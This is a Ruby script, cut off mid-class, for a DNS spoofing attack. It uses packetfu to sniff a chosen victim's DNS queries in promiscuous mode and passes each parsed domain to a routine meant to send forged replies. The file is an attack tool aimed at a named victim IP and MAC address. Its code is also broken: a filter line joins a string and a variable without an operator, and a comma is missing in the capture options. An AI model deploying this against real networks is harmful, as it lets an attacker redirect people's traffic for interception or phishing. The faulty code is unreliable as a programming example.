#!/usr/bin/env ruby

require 'rubygems'
require 'packetfu'

class DNSSpoof

    def initialize(spoof_ip, victim_ip, victim_mac, iface="en1", spoof=false)
        @spoof_ip = spoof_ip
        @victim_ip = victim_ip
        @victim_mac = victim_mac
        @iface = iface
        @cfg = PacketFu::Utils.whoami?(:iface => iface)

        if spoof then
            start
        end
    end #initalize  

    def send(packet, interface)
        packet.to_w(interface)
    end

    def start

        if @running then
            puts "spoofer is already running."
            return
        end

        @running = true

        filter = "udp and port 53 and src " @victim_ip

        puts "Filter: #{filter}"

        cap = PacketFu::Capture.new(:iface => @iface, :start => true
            :promisc => true, :filter => filter, :save => true)

        puts "Dns Packet Sniffing starting.."

        cap.stream.each do |pkt|

            if PacketFu::UDPPacket.can_parse?(pkt) then
                @packet = PacketFu::Packet.parse(pkt)

                dnsquery = @packet.payload[2].to_s + @packet.payload[3].to_s

                if dnsquery == '10' then
                    @domain_name = get_domain(@packet.payload[12..-1])

                    if @domain_name.nil? then
                        puts "Empty domain name feild"
                        next
                    end

                    puts "Domain name: #{@domain_name}"
                    send_response
                end
            end
        end

